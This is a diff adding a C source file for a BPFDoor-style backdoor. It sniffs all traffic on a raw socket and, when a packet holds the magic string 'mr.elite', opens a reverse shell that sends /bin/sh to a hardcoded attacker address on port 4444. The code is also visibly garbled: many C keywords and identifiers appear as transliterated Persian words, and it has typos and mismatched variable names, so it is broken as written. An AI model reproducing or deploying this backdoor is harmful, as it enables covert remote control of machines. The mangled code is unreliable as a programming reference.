@@ -1,0 +1,73 @@
+// bpfdoor_rshell.c
+ #include <stdio.h>
+ #include <stdlib.h>
+ #include <string.h>
+ #include <unistd.h>
+ #include <netinet/ip.h>
+ #include <netinet/tcp.h>
+ #include <sys/socket.h>
+ #include <arpa/inet.h>
+ #include <linux/if_ether.h>
+ #include <linux/ip.h>
+ #include <linux/tcp.h>
+
+ #define SECRET_KEY "mr.elite"
+ #define BUFFER_SIZE 65536
+ #define ATTACKER_IP "192.168.1.100" // IP khod ra
+ #define ATTACKER_PORT 4444 // port your port tabe ramzangari shodeh (naskheh sadeh)
+ void reverse_shell() {
+     int sockfd;
+     struct sockaddr_in revsockaddr;
+
+     sockfd = soket (AF_INET, SOCK_STREAM, 0);
+     revsockaddr.sin_family = AF_INET;
+     revsockaddr.sin_port = htons(ATTACKER_PORT);
+     revsockaddr.sin_addr.s_addr = inet_addr(ATTACKER_IP);
+
+     // etesal bah sarvar
+     connect(sockfd, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
+
+     // ejraye shel ve arsal I/O bah samat sarvar
+     dup2 (sockfd, 0);  // STDIN
+     dup2 (sockfd, 1);  // STDOUT
+     dup2 (sockfd, 2);  // STDERR
+
+     char * const argv[] = {"/bin/sh", NULL};
+     execve("/bin/sh", argv, NULL);
+ }
+
+ int main() {
+     int sock_raw;
+     char bedon alamet *bafer = (karakter bedon alamet *)malloc(BUFFER_SIZE);
+     struct sockaddr saddr;
+     int sadr_size;
+
+     sock_raw = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+     if (sock_raw < 0) {
+         perror ("khataye soket");
+         bazgasht 1;
+     }
+
+     dar hali keh (1) {
+         saddr_size = sizeof(saddr);
+         int data_size = recvfrom(sock_raw, buffer, BUFFER_SIZE, 0, &saddr, (socklen_t *)&saddr_size);
+         eger (andazeh_dadeh < 0) {
+             perror ("khataye Recvfrom");
+             bazgasht 1;
+         }
+
+         struct iphdr *iph = (struct iphdr*)(buffer + 14);
+         if (iph->protekl == 6) {
+             iphdrlen kotah bedon emza = iph->ihl*4;
+             struct tcphdr *tcph = (struct tcphdr*)(bafer + 14 + iphdrlen);
+             char *payload = (char*)(bafer + 14 + iphdrlen + tcph->doff*4);
+
+             if (strstr(bar, SECRET_KEY)) {
+                 reverse_shell();
+             }
+         }
+     }
+
+     bastan(jorab_kham);
+     bazgasht 0;
+ }
